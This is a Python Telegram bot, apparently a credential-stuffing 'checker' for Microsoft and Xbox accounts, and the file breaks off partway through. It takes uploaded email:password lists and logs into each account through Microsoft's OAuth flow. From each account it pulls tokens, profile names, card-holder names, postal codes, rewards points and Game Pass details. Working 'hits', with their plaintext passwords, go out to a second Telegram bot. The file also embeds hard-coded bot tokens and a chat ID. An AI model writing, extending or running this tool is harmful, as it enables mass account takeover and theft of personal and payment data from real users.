#!/usr/bin/env python3
"""
XBOX PREMIUM CHECKER BOT - ORIGINAL CODE INTEGRATED
Complete 9-step validation from your original script
Multi-worker queue with proper stacking
"""

import os
import re
import json
import uuid
import time
import sqlite3
import logging
import requests
import asyncio
import concurrent.futures
from datetime import datetime, timedelta
from threading import Lock, Thread
from pathlib import Path
from urllib.parse import quote, unquote
from collections import deque
from dataclasses import dataclass
from typing import Dict, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================

MAIN_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
PREMIUM_BOT_TOKEN = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
PREMIUM_CHAT_ID = "8260250818"
MAX_CONCURRENT_WORKERS = 7

DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

DB_FILE = os.path.join(DATA_DIR, "checked.db")
RESULT_DIR = os.path.join(DATA_DIR, "results")
os.makedirs(RESULT_DIR, exist_ok=True)

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# YOUR ORIGINAL TELEGRAM SENDER (UNCHANGED)
# ============================================================

class TelegramSender:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{PREMIUM_BOT_TOKEN}"
    
    def send_message(self, text):
        def _send():
            try:
                url = f"{self.base_url}/sendMessage"
                payload = {
                    "chat_id": PREMIUM_CHAT_ID,
                    "text": text,
                    "parse_mode": "HTML"
                }
                requests.post(url, data=payload, timeout=10)
            except Exception:
                pass
        Thread(target=_send, daemon=True).start()
    
    def format_hit_message(self, email, password, data):
        premium_type = data.get('premium_type', 'PREMIUM')
        country = data.get('country', 'N/A')
        days = data.get('days_remaining', '0')
        auto_renew = data.get('auto_renew', 'NO')
        renewal_date = data.get('renewal_date', 'N/A')
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        name = data.get('name', '')
        card_holder = data.get('card_holder', '')
        rewards_points = data.get('rewards_points', '')
        
        if renewal_date != 'N/A':
            try:
                renewal_obj = datetime.fromisoformat(renewal_date)
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        message = "\U0001f9ce\u033b\U0001f9ce\u033b  \U0001f3ae\U0001f380\n"
        message += f"\U0001f337 <code>{email}</code> \U0001f337 \U0001f510 <code>{password}</code>\n"
        message += f"\U0001f338 <b>{premium_type}</b> ({country}) \u23f3 {days} days \U0001f501 <b>Renews {renewal_formatted}</b> \U0001f4b8 ${total_amount} {currency}\n"
        
        if name:
            message += f"\U0001f349 <i>{name}</i> \u2727 \u2661\n"
        if card_holder:
            message += f"\U0001f4b3 {card_holder}\n"
        if rewards_points:
            message += f"\u2b50 {rewards_points} points\n"
            
        message += "\U0001f9ce\u033b \u2727\u2661\n"
        message += "\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
        
        return message

# ============================================================
# YOUR ORIGINAL XBOX CHECKER (COMPLETE - UNMODIFIED)
# ============================================================

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
    
    def log(self, message):
        if self.debug:
            logger.info("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            self.log("Checking: " + email)
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # Step 1: IDP Check
            self.log("Step 1: IDP check...")
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            self.log("IDP Response: " + str(r1.status_code))
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("IDP check failed")
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                self.log("MSAccount not found")
                return {"status": "BAD", "data": {}}
            self.log("IDP check success")
            
            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            time.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                self.log("PPFT or URL not found")
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            self.log("PPFT found: " + ppft[:30] + "...")
            
            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log("Login Response: " + str(r3.status_code))
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                self.log("Bad credentials")
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                self.log("2FA required")
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                self.log("Account banned")
                return {"status": "BANNED", "data": {}}
            location = r3.headers.get("Location", "")
            if not location:
                self.log("Redirect location not found")
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("Auth code not found")
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            self.log("Auth code obtained: " + code[:30] + "...")
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("CID not found")
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()
            self.log("CID: " + cid)
            
            # Step 4: Get access token
            self.log("Step 4: Getting token...")
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                self.log("Access token not obtained")
                return {"status": "BAD", "data": {}}
            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log("Token obtained")
            
            # Step 5: Get profile info
            self.log("Step 5: Getting profile info...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            country = ""
            name = ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
                    self.log("Profile: Name=" + name + " | Country=" + country)
            except Exception as e:
                self.log("Profile error: " + str(e))
            
            # Step 6: Get Xbox payment token
            self.log("Step 6: Getting Xbox payment token...")
            time.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "data": {"country": country, "name": name}}
            self.log("Payment token obtained")
            
            # Step 7: Check payment instruments
            self.log("Step 7: Checking payment instruments...")
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            correlation_id2 = str(uuid.uuid4())
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except Exception as e:
                self.log("Payment instruments error: " + str(e))
            
            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # Step 9: Check subscription
            self.log("Step 9: Checking subscription...")
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    response_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    has_premium = False
                    premium_type = "FREE"
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break
                    if has_premium:
                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                        if title_match:
                            subscription_data['title'] = title_match.group(1)
                        start_match = re.search(r'"startDate"\s*:\s*"([^T"]+)', response_text)
                        if start_match:
                            subscription_data['start_date'] = start_match.group(1)
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)
                        subscription_data['premium_type'] = premium_type
                        subscription_data['has_premium'] = True
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            self.log("Subscription expired")
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        self.log("Premium found: " + premium_type)
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        self.log("No subscription - FREE")
                        return {"status": "FREE", "data": payment_data}
            except Exception as e:
                self.log("Subscription error: " + str(e))
                return {"status": "FREE", "data": payment_data}
            return {"status": "FREE", "data": {**payment_data, **subscription_data}}
        except requests.exceptions.Timeout:
            self.log("Timeout")
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            self.log("Exception: " + str(e))
            return {"status": "ERROR", "data": {}}

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
        file_id TEXT PRIMARY KEY,
        file_name TEXT,
        processed_at TIMESTAMP,
        status TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS cancelled_tasks (
        task_id TEXT PRIMARY KEY,
        cancelled_at TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def is_file_processed(file_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT 1 FROM processed_files WHERE file_id = ?", (file_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def mark_file_processed(file_id: str, file_name: str, status: str = "completed"):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO processed_files (file_id, file_name, processed_at, status) VALUES (?, ?, ?, ?)",
              (file_id, file_name, datetime.now().isoformat(), status))
    conn.commit()
    conn.close()

def is_task_cancelled(task_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT 1 FROM cancelled_tasks WHERE task_id = ?", (task_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def add_cancelled_task(task_id: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO cancelled_tasks (task_id, cancelled_at) VALUES (?, ?)",
              (task_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def clear_cancelled_tasks():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM cancelled_tasks")
    conn.commit()
    conn.close()

# ============================================================
# MULTI-WORKER QUEUE MANAGER
# ============================================================

@dataclass
class Task:
    id: int
    file_path: str
    file_name: str
    file_id: str
    user_id: int
    status: str = "pending"
    total: int = 0
    premium: int = 0
    free: int = 0
    bad: int = 0
    created_at: datetime = None
    
    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()

class MultiWorkerQueue:
    def __init__(self, max_workers: int = 7):
        self.queue = deque()
        self.active_tasks: Dict[int, Task] = {}
        self.completed_tasks: Dict[int, Task] = {}
        self.task_counter = 0
        self.max_workers = max_workers
        self.lock = Lock()
        self.paused = False
    
    def add_task(self, file_path: str, file_name: str, file_id: str, user_id: int) -> int:
        with self.lock:
            self.task_counter += 1
            task = Task(
                id=self.task_counter,
                file_path=file_path,
                file_name=file_name,
                file_id=file_id,
                user_id=user_id
            )
            self.queue.append(task)
            logger.info(f"Task #{task.id} added to queue: {file_name}")
            return task.id
    
    def get_available_worker_slot(self) -> Optional[Task]:
        with self.lock:
            if self.paused:
                return None
            if len(self.active_tasks) >= self.max_workers:
                return None
            if not self.queue:
                return None
            task = self.queue.popleft()
            task.status = "processing"
            self.active_tasks[task.id] = task
            logger.info(f"Task #{task.id} started (active: {len(self.active_tasks)}/{self.max_workers})")
            return task
    
    def complete_task(self, task_id: int, stats: dict = None):
        with self.lock:
            if task_id in self.active_tasks:
                task = self.active_tasks.pop(task_id)
                task.status = "completed"
                if stats:
                    task.premium = stats.get('premium', 0)
                    task.free = stats.get('free', 0)
                    task.bad = stats.get('bad', 0)
                    task.total = stats.get('total', 0)
                self.completed_tasks[task_id] = task
                mark_file_processed(task.file_id, task.file_name, "completed")
                logger.info(f"Task #{task_id} completed")
                return True
        return False
    
    def cancel_task(self, task_id: int) -> bool:
        with self.lock:
            if task_id in self.active_tasks:
                task = self.active_tasks.pop(task_id)
                task.status = "cancelled"
                add_cancelled_task(str(task_id))
                logger.info(f"Task #{task_id} cancelled (active)")
                return True
            for task in list(self.queue):
                if task.id == task_id:
                    self.queue.remove(task)
                    add_cancelled_task(str(task_id))
                    logger.info(f"Task #{task_id} cancelled (queue)")
                    return True
        return False
    
    def cancel_all_tasks(self) -> int:
        count = 0
        with self.lock:
            for task in list(self.queue):
                add_cancelled_task(str(task.id))
                self.queue.remove(task)
                count += 1
            for task_id, task in list(self.active_tasks.items()):
                task.status = "cancelled"
                add_cancelled_task(str(task_id))
                self.active_tasks.pop(task_id)
                count += 1
        logger.info(f"Cancelled {count} tasks")
        return count
    
    def pause(self):
        with self.lock:
            self.paused = True
            logger.info("Queue paused")
    
    def resume(self):
        with self.lock:
            self.paused = False
            logger.info("Queue resumed")
    
    def get_stats(self) -> dict:
        with self.lock:
            return {
                'pending': len(self.queue),
                'active': len(self.active_tasks),
                'completed': len(self.completed_tasks),
                'max_workers': self.max_workers,
                'paused': self.paused
            }
    
    def get_active_tasks(self) -> List[Task]:
        with self.lock:
            return list(self.active_tasks.values())
    
    def get_pending_tasks(self) -> List[Task]:
        with self.lock:
            return list(self.queue)

queue_manager = MultiWorkerQueue(max_workers=MAX_CONCURRENT_WORKERS)

# ============================================================
# PREMIUM HIT SENDER (Using Your Original TelegramSender)
# ============================================================

telegram_sender = TelegramSender()

async def send_premium_hit(email: str, password: str, data: dict, user_id: int):
    """Send premium hit using your original TelegramSender"""
    formatted_msg = telegram_sender.format_hit_message(email, password, data)
    
    # Send to main bot chat
    try:
        await app.bot.send_message(chat_id=user_id, text=formatted_msg, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to send to main bot: {e}")
    
    # Send to premium receiver bot using your original sender
    telegram_sender.send_message(formatted_msg)

# ============================================================
# WORKER PROCESSOR
# ============================================================

async def process_file_task(task: Task):
    try:
        if is_task_cancelled(str(task.id)):
            logger.info(f"Task {task.id} cancelled before start")
            queue_manager.complete_task(task.id)
            return
        
        with open(task.file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip() and ':' in l]
        
        if not lines:
            await app.bot.send_message(
                chat_id=task.user_id,
                text=f"❌ No valid accounts in {task.file_name}"
            )
            queue_manager.complete_task(task.id)
            return
        
        stats = {
            'total': len(lines),
            'premium': 0,
            'free': 0,
            'bad': 0,
            'twofa': 0,
            'banned': 0,
            'expired': 0,
            'timeout': 0,
            'error': 0
        }
        
        checker = XboxChecker(debug=False)
        batch_results = []
        batch_size = 10
        
        await app.bot.send_message(
            chat_id=task.user_id,
            text=f"🚀 **Task #{task.id} Started**\n📄 `{task.file_name}`\n📊 Total: {stats['total']} accounts\n⚡ Workers: {queue_manager.max_workers} concurrent",
            parse_mode='Markdown'
        )
        
        for idx, line in enumerate(lines, 1):
            if is_task_cancelled(str(task.id)):
                await app.bot.send_message(
                    chat_id=task.user_id,
                    text=f"🛑 **Task #{task.id} cancelled**"
                )
                break
            
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                if status == 'PREMIUM':
                    stats['premium'] += 1
                    batch_results.append(f"✅ {email[:35]}... - PREMIUM")
                    await send_premium_hit(email, password, data, task.user_id)
                    
                elif status == 'FREE':
                    stats['free'] += 1
                    batch_results.append(f"🆓 {email[:35]}... - FREE")
                elif status == '2FACTOR':
                    stats['twofa'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"🔐 {email[:35]}... - 2FA")
                elif status == 'BANNED':
                    stats['banned'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"🚫 {email[:35]}... - BANNED")
                elif status == 'EXPIRED':
                    stats['expired'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"⏰ {email[:35]}... - EXPIRED")
                elif status == 'TIMEOUT':
                    stats['timeout'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"⏱️ {email[:35]}... - TIMEOUT")
                elif status == 'ERROR':
                    stats['error'] += 1
                    stats['bad'] += 1
                    batch_results.append(f"⚠️ {email[:35]}... - ERROR")
                else:
                    stats['bad'] += 1
                    batch_results.append(f"❌ {email[:35]}... - BAD")
                
                if len(batch_results) >= batch_size:
                    progress_msg = (
                        f"📊 **Task #{task.id} Progress**\n"
                        f"┌─────────────────────┐\n"
                        f"│ {idx}/{stats['total']} accounts\n"
                        f"│ ✅ Premium: {stats['premium']}\n"
                        f"│ 🆓 Free: {stats['free']}\n"
                        f"│ ❌ Bad: {stats['bad']}\n"
                        f"└─────────────────────┘\n\n"
                        f"```\n" + "\n".join(batch_results) + "\n```"
                    )
                    await app.bot.send_message(chat_id=task.user_id, text=progress_msg, parse_mode='Markdown')
                    batch_results = []
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                stats['error'] += 1
                stats['bad'] += 1
                logger.error(f"Line error: {e}")
        
        if batch_results and not is_task_cancelled(str(task.id)):
            final_batch = f"📊 **Task #{task.id} Final Batch**\n\n```\n" + "\n".join(batch_results) + "\n```"
            await app.bot.send_message(chat_id=task.user_id, text=final_batch, parse_mode='Markdown')
        
        if not is_task_cancelled(str(task.id)):
            summary = (
                f"✅ **TASK #{task.id} COMPLETE**\n"
                f"┌─────────────────────────────────┐\n"
                f"│ 📄 {task.file_name}\n"
                f"│ ───────────────────────────────\n"
                f"│ 🔢 Total: {stats['total']}\n"
                f"│ ✅ PREMIUM: {stats['premium']}\n"
                f"│ 🆓 FREE: {stats['free']}\n"
                f"│ ❌ BAD: {stats['bad']}\n"
                f"│ 🔐 2FA: {stats['twofa']}\n"
                f"│ 🚫 BANNED: {stats['banned']}\n"
                f"│ ⏰ EXPIRED: {stats['expired']}\n"
                f"└─────────────────────────────────┘\n"
            )
            await app.bot.send_message(chat_id=task.user_id, text=summary, parse_mode='Markdown')
        
        queue_manager.complete_task(task.id, stats)
        
    except Exception as e:
        logger.error(f"Process error: {e}")
        try:
            await app.bot.send_message(chat_id=task.user_id, text=f"❌ Error: {str(e)[:200]}")
        except:
            pass
        queue_manager.complete_task(task.id)
    
    finally:
        if os.path.exists(task.file_path):
            try:
                os.remove(task.file_path)
            except:
                pass

async def worker_controller():
    while True:
        try:
            task = queue_manager.get_available_worker_slot()
            if task:
                asyncio.create_task(process_file_task(task))
            await asyncio.sleep(0.5)
        except Exception as e:
            logger.error(f"Worker controller error: {e}")
            await asyncio.sleep(5)

# ============================================================
# TELEGRAM COMMANDS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = queue_manager.get_stats()
    msg = (
        "🎮 **XBOX PREMIUM CHECKER BOT**\n"
        "═══════════════════════════\n\n"
        f"⚡ **Active Workers:** {stats['max_workers']}\n"
        f"🔄 **Processing:** {stats['active']} files\n"
        f"⏳ **Queue:** {stats['pending']} files\n"
        f"✅ **Completed:** {stats['completed']} files\n\n"
        "**Commands:**\n"
        "• /start - Show this menu\n"
        "• /status - Queue status\n"
        "• /queue - List pending tasks\n"
        "• /active - Show active tasks\n"
        "• /cancel [id] - Cancel task\n"
        "• /cancel_all - Cancel all\n"
        "• /pause - Pause queue\n"
        "• /resume - Resume queue\n\n"
        "**Usage:**\n"
        "Send a `.txt` file with `email:password` format\n"
        "Premium hits go to dedicated bot with original styling"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = queue_manager.get_stats()
    msg = (
        f"📊 **QUEUE STATUS**\n"
        f"═══════════════════\n\n"
        f"⚡ **Max Workers:** {stats['max_workers']}\n"
        f"🔄 **Active:** {stats['active']}\n"
        f"⏳ **Pending:** {stats['pending']}\n"
        f"✅ **Completed:** {stats['completed']}\n"
        f"⏸️ **Paused:** {'Yes' if stats['paused'] else 'No'}\n"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def queue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tasks = queue_manager.get_pending_tasks()
    if not tasks:
        await update.message.reply_text("📭 No pending tasks in queue")
        return
    
    msg = "⏳ **PENDING TASKS**\n═══════════════\n\n"
    for i, task in enumerate(tasks[:20], 1):
        msg += f"{i}. Task #{task.id}: {task.file_name[:40]}...\n"
    
    if len(tasks) > 20:
        msg += f"\n... and {len(tasks) - 20} more"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def active_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tasks = queue_manager.get_active_tasks()
    if not tasks:
        await update.message.reply_text("📭 No active tasks")
        return
    
    msg = "🔄 **ACTIVE TASKS**\n═══════════════\n\n"
    for task in tasks:
        msg += f"• Task #{task.id}: {task.file_name[:40]}...\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: `/cancel [task_id]`\nUse `/active` or `/queue` to see task IDs", parse_mode='Markdown')
        return
    
    try:
        task_id = int(args[0])
        if queue_manager.cancel_task(task_id):
            await update.message.reply_text(f"✅ Task #{task_id} cancelled")
        else:
            await update.message.reply_text(f"❌ Task #{task_id} not found")
    except ValueError:
        await update.message.reply_text("❌ Invalid task ID")

async def cancel_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = queue_manager.cancel_all_tasks()
    await update.message.reply_text(f"✅ Cancelled {count} tasks")

async def pause_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    queue_manager.pause()
    await update.message.reply_text("⏸️ Queue processing paused")

async def resume_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    queue_manager.resume()
    await update.message.reply_text("▶️ Queue processing resumed")

async def workers_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"⚡ **Worker Configuration**\n\n"
        f"• Max concurrent: {MAX_CONCURRENT_WORKERS}\n"
        f"• Files processed simultaneously: {MAX_CONCURRENT_WORKERS}\n"
        f"• Queue can handle unlimited files\n\n"
        f"To adjust, change `MAX_CONCURRENT_WORKERS` variable",
        parse_mode='Markdown'
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    user_id = update.effective_user.id
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file")
        return
    
    if is_file_processed(doc.file_id):
        await update.message.reply_text(f"⚠️ `{doc.file_name}` already processed", parse_mode='Markdown')
        return
    
    # Download file
    file = await context.bot.get_file(doc.file_id)
    temp_path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(temp_path)
    
    # Validate
    with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip() and ':' in l]
    
    if not lines:
